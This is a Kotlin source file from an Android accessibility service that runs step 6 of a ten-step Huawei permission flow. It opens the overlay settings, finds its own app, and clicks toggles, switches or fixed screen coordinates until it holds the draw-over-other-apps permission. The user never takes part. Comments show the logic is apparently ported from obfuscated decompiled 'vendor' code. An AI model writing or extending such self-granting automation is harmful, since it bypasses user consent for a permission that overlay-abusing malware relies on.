package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.Context
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.OverlayListDetector
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder
import kotlinx.coroutines.delay

/**
 * Step 6/10 -- Overlay Permission (vendor m212172b9, L4566-5805).
 *
 * Opens ACTION_MANAGE_OVERLAY_PERMISSION, searches for our app in the list,
 * navigates to detail page, and toggles the overlay switch ON.
 */
class HuaweiStep6Overlay(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep6Overlay"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step6/10] enter executeStep6OverlayPermission")
        HuaweiStepLogger.phase(6, "悬浮窗权限开始", "vendor m212172b9 L4566", logs)

        if (canDrawOverlaysNow()) {
            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
            HuaweiStepLogger.success(6, "已有悬浮窗权限，跳过", "vendor L4744-4747", successes)
            return
        }

        val maxAttempts = 3
        for (attempt in 1..maxAttempts) {
            logs.add("[Step6/10] 第 $attempt 次尝试 (vendor outer loop L4752)")
            try {
                logs.add("[Step6/10] 步骤1: 打开悬浮窗设置 (vendor L4753)")
                val intent = android.content.Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION").apply {
                    setFlags(276824064)
                }
                val launcher: Context = service ?: steps.ctx
                launcher.startActivity(intent)

                delay(500L)
                val detectorRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                val pageType = OverlayListDetector.detect(detectorRoot)
                HuaweiStepLogger.probe(6, "page type after MANAGE_OVERLAY_PERMISSION", pageType)
                if (pageType == OverlayListDetector.PageType.DETAIL) {
                    logs.add("[Step6/10] DETAIL 页直达 fallback (ADAPT real-device hardening)")
                    val toggled = toggleOverlaySwitch()
                    HuaweiStepLogger.probe(6, "toggleOverlaySwitch (detail path)", toggled)
                    if (toggled) {
                        HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                        HuaweiStepLogger.success(6, "悬浮窗开关已切换（详情页 fallback）", "", successes)
                        return
                    }
                }

                logs.add("[Step6/10] 步骤2: 等待列表加载(超时5秒) (vendor L4757)")
                val timedOut = waitForOverlayListLoaded(5000L)

                if (timedOut) {
                    logs.add("[Step6/10] 列表未加载，返回后重新开始 (vendor L4767)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L)
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L)
                    continue
                }

                logs.add("[Step6/10] 步骤3: 点击搜索应用 (vendor L4804-4805)")
                clickSearchButton()
                delay(500L)

                logs.add("[Step6/10] 步骤4: 输入应用名 (vendor L4812)")
                val searchBox = findAndFocusSearchBox()
                if (searchBox != null) {
                    delay(100L)
                    setSearchBoxText(searchBox, steps.appLabel)
                    logs.add("[Step6/10] 输入: ${steps.appLabel} (vendor L4832)")
                } else {
                    logs.add("[Step6/10] 未找到搜索框 viewId (vendor L4836-4837)")
                }

                logs.add("[Step6/10] 步骤5: 等待搜索结果 (vendor L4839)")
                delay(1000L)

                val appeared = searchForAppInOverlayList(steps.appLabel)

                logs.add("[Step6/10] 步骤6: 点击应用 (vendor L4855-4856)")
                val appClicked = clickAppInOverlayList(steps.appLabel)

                if (!appClicked) {
                    val svc = service
                    if (svc != null && !canDrawOverlaysNow()) {
                        val (fx, fy) = HuaweiSteps.getOverlayListFallbackPoint(
                            steps.getScreenWidthPx(), steps.getScreenHeightPx()
                        )
                        HuaweiStepLogger.probe(6, "list-coord-fallback", "tap ($fx,$fy)")
                        logs.add("║ [Step6/10] list-coord-fallback tap ($fx, $fy)")
                        GestureTapHelper.performTap(svc, fx, fy, durationMs = GestureTapHelper.TAP_DURATION_MS_SHORT)
                        delay(800L)
                        if (canDrawOverlaysNow()) {
                            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                            successes.add("[Step6/10] 悬浮窗权限已开启（列表坐标 fallback）")
                            return
                        }
                    }

                    logs.add("[Step6/10] 未找到应用，返回后重新开始 (vendor L5256)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L)
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L)
                    continue
                }

                delay(500L)

                val detailCheck = isOnOverlayDetailPageNow()
                android.util.Log.i(TAG, "[Step6/10] isOnOverlayDetailPageNow=$detailCheck, canDrawOverlays=${canDrawOverlaysNow()}")
                if (canDrawOverlaysNow()) {
                    android.util.Log.i(TAG, "[Step6/10] 列表页直接切换成功 -- canDrawOverlays=true")
                    HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启（列表页切换）")
                    return
                }
                if (!detailCheck) {
                    logs.add("[Step6/10] 未进入悬浮窗详情页，返回后重新开始 (vendor L4907)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(300L)
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(500L)
                    continue
                }

                android.util.Log.i(TAG, "[Step6/10] toggleOverlaySwitch (on detail page)")
                val toggled = toggleOverlaySwitch()
                android.util.Log.i(TAG, "[Step6/10] toggleOverlaySwitch=$toggled, canDrawOverlays=${canDrawOverlaysNow()}")

                if (canDrawOverlaysNow()) {
                    logs.add("[Step6/10] 完成 (vendor L5080)")
                    HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启")
                    return
                }

                if (toggled) {
                    var switchClicked = false
                    for (swAttempt in 0 until 6) {
                        delay(100L)
                        switchClicked = clickFirstSwitchOnDetailPage(targetChecked = true)
                        if (switchClicked && canDrawOverlaysNow()) {
                            logs.add("[Step6/10] 开关点击成功 (vendor L5161)")
                            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                            successes.add("[Step6/10] 悬浮窗权限已开启")
                            return
                        }
                    }
                    logs.add("[Step6/10] 开关点击后仍未授权 (vendor L5089)")
                }

                if (canDrawOverlaysNow()) {
                    HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP6_OVERLAY)
                    successes.add("[Step6/10] 悬浮窗权限已开启")
                    return
                }

            } catch (e: Exception) {
                logs.add("[Step6/10] 异常: ${e.message} (vendor L4699)")
            }
        }

        logs.add("[Step6/10] 3次尝试后流程结束 (vendor outer loop exhausted)")
    }

    // ---- helpers ----

    private fun canDrawOverlaysNow(): Boolean {
        val canDraw = try {
            android.provider.Settings.canDrawOverlays(steps.ctx)
        } catch (_: Exception) { false }
        if (!canDraw) return false

        return try {
            val appOps = steps.ctx.getSystemService(android.content.Context.APP_OPS_SERVICE)
                as? android.app.AppOpsManager ?: return canDraw
            val mode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    android.os.Process.myUid(),
                    steps.ctx.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    android.os.Process.myUid(),
                    steps.ctx.packageName
                )
            }
            val granted = mode == android.app.AppOpsManager.MODE_ALLOWED
            android.util.Log.d(TAG, "[Step6] canDrawOverlaysNow: canDraw=$canDraw appOpsMode=$mode granted=$granted")
            granted
        } catch (_: Exception) {
            canDraw
        }
    }

    private suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val texts = HuaweiPageDetector.collectTexts(root)
                val count = texts.count { t -> t.contains("允许") || t.contains("不允许") }
                if (count >= 1) return false
            }
            delay(200L)
        }
        return true
    }

    private fun clickSearchButton(): Boolean {
        return ui.clickSelector("[text=\"搜索应用\"][visibleToUser=true]")
    }

    private fun findAndFocusSearchBox(): AccessibilityNodeInfo? {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        for (viewId in HuaweiSteps.OVERLAY_SEARCH_BOX_IDS) {
            val nodes = try { root.findAccessibilityNodeInfosByViewId(viewId) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                val node = nodes[0]
                node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                return node
            }
        }
        return null
    }

    private fun setSearchBoxText(node: AccessibilityNodeInfo, text: String) {
        val bundle = android.os.Bundle().apply {
            putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", text)
        }
        node.performAction(2097152, bundle)
    }

    private suspend fun searchForAppInOverlayList(appLabel: String): Boolean {
        for (poll in 0 until 10) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val nodes = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                    return false
                }
            }
            delay(100L)
        }
        return true
    }

    private fun clickAppInOverlayList(appLabel: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val appNodes = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null } ?: return false

        for (n in appNodes) {
            if (!n.isVisibleToUser) continue
            android.util.Log.d(TAG, "[Step6 overlay] 找到 appLabel 节点: ${n.text}")

            val toggleNode = findSiblingText(n, "不允许", maxDepth = 4)
            if (toggleNode != null && toggleNode.isClickable) {
                android.util.Log.i(TAG, "[Step6 overlay] 列表页直接点击 '不允许' -> 切换为 '允许'")
                toggleNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            if (toggleNode != null) {
                val clickResult = ui.click(toggleNode)
                if (clickResult) {
                    android.util.Log.i(TAG, "[Step6 overlay] 通过 parent 点击 '不允许'")
                    return true
                }
            }

            if (n.isClickable && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                android.util.Log.d(TAG, "[Step6 overlay] 点击 appLabel 进入详情页 (vendor 路径)")
                return true
            }
            var parent: AccessibilityNodeInfo? = try { n.parent } catch (_: Exception) { null }
            var depth = 0
            while (parent != null && depth < 5) {
                if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
                parent = try { parent.parent } catch (_: Exception) { null }
                depth++
            }
        }
        return false
    }

    private fun findSiblingText(
        node: AccessibilityNodeInfo,
        targetText: String,
        maxDepth: Int
    ): AccessibilityNodeInfo? {
        var parent = try { node.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < maxDepth) {
            val count = try { parent.childCount } catch (_: Exception) { 0 }
            for (i in 0 until count) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                val txt = child.text?.toString() ?: ""
                if (txt == targetText && child.isVisibleToUser) {
                    return child
                }
            }
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        return null
    }

    private fun isOnOverlayDetailPageNow(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnOverlayDetailPage(root)
    }

    private suspend fun toggleOverlaySwitch(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            val allTexts = HuaweiPageDetector.collectTexts(root)
            android.util.Log.i(TAG, "[Step6/10] 详情页全部文本(${allTexts.size}): ${allTexts.take(15)}")
        }

        for (switchText in HuaweiSteps.OVERLAY_SWITCH_TEXTS) {
            val toggled = ui.openSwitch(switchText)
            android.util.Log.d(TAG, "[Step6/10] ui.openSwitch('$switchText')=$toggled")
            if (toggled) return true
        }
        if (canDrawOverlaysNow()) return true

        android.util.Log.i(TAG, "[Step6/10] OVERLAY_SWITCH_TEXTS 全部未命中，尝试 clickFirstSwitch fallback")
        val fallback = clickFirstSwitchOnDetailPage(targetChecked = true)
        android.util.Log.i(TAG, "[Step6/10] clickFirstSwitchOnDetailPage=$fallback")
        if (fallback) {
            delay(500L)
            if (canDrawOverlaysNow()) return true
        }

        return false
    }

    private fun clickFirstSwitchOnDetailPage(targetChecked: Boolean? = null): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val sw = findFirstSwitchInTree(root) ?: return false
        if (targetChecked != null && sw.isChecked == targetChecked) {
            android.util.Log.d(TAG, "clickFirstSwitchOnDetailPage: 已处于目标状态 (isChecked=$targetChecked), 跳过")
            return true
        }
        return sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun findFirstSwitchInTree(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 20) return null
        if (SwitchNodeFinder.isSwitchLike(node) || node.isCheckable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstSwitchInTree(child, depth + 1)
            if (found != null) return found
        }
        return null
    }
}
